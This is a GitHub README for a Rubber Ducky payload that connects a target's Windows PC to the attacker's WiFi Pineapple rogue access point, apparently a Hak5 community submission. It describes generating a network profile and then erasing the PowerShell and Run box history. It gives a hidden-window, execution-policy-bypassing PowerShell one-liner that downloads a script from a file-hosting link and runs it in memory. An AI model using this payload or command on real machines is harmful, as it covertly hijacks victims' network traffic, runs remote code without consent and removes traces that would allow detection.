![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/OMG-AcidBurn/logo-170-px.png?raw=true)

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#getting-started">Getting Started</a></li>
    <li><a href="#Contributing">Contributing</a></li>
    <li><a href="#Version-History">Version History</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

# RD-PineApple

A script used to connect a targets PC to your wifi PineApple using the Rubber Ducky

## Description

This program will use the Rubber Ducky to connect target pc to your Wifi PineApples wireless access point
It will generate an XML file that will be used to create a network profile for your Wifi PineApple. 
Depending on your method of execution the XML file will either be manually entered into a powershell window 
or you may use and Invoke Web-Request to download a script to add the network profile. After either the history of
the powershell window and run box will be erased for a clean exit. 

## Getting Started

### Dependencies

* DropBox or another File Hosting service - Your Shared link for the intended file
* Windows 10,11

<p align="right">(<a href="#top">back to top</a>)</p>

### Executing program

* Plug in RubberDucky
* Either the entire script will be manually entered into the powershell window or
* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
* PS1 file to download is provided above
```
powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
```

<p align="right">(<a href="#top">back to top</a>)</p>

## Contributing

All contributors names will be listed here

I am Jakoby

<p align="right">(<a href="#top">back to top</a>)</p>

## Version History

* 0.1
    * Initial Release

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- CONTACT -->
## Contact

<div><h2>I am Jakoby</h2></div>
  <p><br/>
  
  <img src="https://media.giphy.com/media/VgCDAzcKvsR6OM0uWg/giphy.gif" width="50"> 
  
  <a href="https://github.com/I-Am-Jakoby/">
    <img src="https://img.shields.io/badge/GitHub-I--Am--Jakoby-blue">
  </a>
  
  <a href="https://www.instagram.com/i_am_jakoby/">
    <img src="https://img.shields.io/badge/Instagram-i__am__jakoby-red">
  </a>
  
  <a href="https://twitter.com/I_Am_Jakoby/">
    <img src="https://img.shields.io/badge/Twitter-I__Am__Jakoby-blue">
  </a>
  
  <a href="https://www.youtube.com/c/IamJakoby/">
    <img src="https://img.shields.io/badge/YouTube-I_am_Jakoby-red">
  </a>

  Project Link: [https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/RD-PineApple)
</p>



<p align="right">(<a href="#top">back to top</a>)</p>

<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

* [Hak5](https://hak5.org/)
* [MG](https://github.com/OMG-MG)



<p align="right">(<a href="#top">back to top</a>)</p>
